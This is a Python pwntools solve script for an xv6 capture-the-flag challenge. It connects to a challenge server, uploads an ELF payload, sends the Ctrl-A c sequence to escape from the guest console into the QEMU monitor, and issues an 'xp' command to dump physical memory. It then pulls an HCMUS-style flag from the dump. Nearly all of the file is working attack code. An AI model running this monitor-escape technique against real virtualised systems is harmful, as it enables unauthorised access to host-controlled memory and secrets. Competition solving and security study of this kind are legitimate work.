#!/usr/bin/env python3
from __future__ import annotations

import argparse
import re
import sys
from pathlib import Path

from pwn import remote


DEFAULT_HOST = "xv6.blackpinker.com"
DEFAULT_PORT = 1337
DEFAULT_ADDR = 0x87FFF000
DEFAULT_DUMP_LEN = 128


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Solve xv6 challenge by switching to QEMU monitor and dumping flag page."
    )
    parser.add_argument(
        "--host",
        default=DEFAULT_HOST,
        help=f"challenge host (default: {DEFAULT_HOST})",
    )
    parser.add_argument(
        "--port",
        default=DEFAULT_PORT,
        type=int,
        help=f"challenge port (default: {DEFAULT_PORT})",
    )
    parser.add_argument(
        "--payload",
        default="problems/xv6/upstream-xv6/user/_loop",
        help="path to init ELF payload",
    )
    parser.add_argument(
        "--addr",
        default=DEFAULT_ADDR,
        type=lambda x: int(x, 0),
        help=f"physical address to dump (default: {hex(DEFAULT_ADDR)})",
    )
    parser.add_argument(
        "--dump-len",
        default=DEFAULT_DUMP_LEN,
        type=int,
        help=f"bytes to dump with xp (default: {DEFAULT_DUMP_LEN})",
    )
    parser.add_argument(
        "--boot-marker",
        default="loop ready",
        help="text to wait for before monitor escape",
    )
    return parser.parse_args()


def extract_flag(blob: bytes) -> str | None:
    # Accept common CTF prefix styles.
    m = re.search(rb"(?:HCMUS[-_]CTF|HCMUS)[{][^}\n]+[}]", blob)
    if not m:
        return None
    return m.group(0).decode("ascii", errors="replace")


def main() -> int:
    args = parse_args()
    payload_path = Path(args.payload)
    if not payload_path.exists():
        print(f"payload not found: {payload_path}", file=sys.stderr)
        return 1

    payload = payload_path.read_bytes()
    io = remote(args.host, args.port)

    try:
        io.recvuntil(b"raw bytes\n", timeout=5)
        io.sendline(str(len(payload)).encode())
        io.send(payload)

        io.recvuntil(args.boot_marker.encode(), timeout=8)

        # QEMU stdio multiplexer: Ctrl-A then c enters monitor.
        io.send(b"\x01c")
        io.sendline(f"xp /{args.dump_len}bx {hex(args.addr)}".encode())

        out = io.recvrepeat(2).decode("latin1", errors="replace")
        print(out, end="")

        pairs = re.findall(r"0x([0-9a-fA-F]{2})", out)
        data = bytes(int(x, 16) for x in pairs)
        flag = extract_flag(data)
        if flag:
            print(f"\nFLAG: {flag}")
            return 0

        print("\nflag pattern not found in dump", file=sys.stderr)
        return 2
    finally:
        io.close()


if __name__ == "__main__":
    raise SystemExit(main())
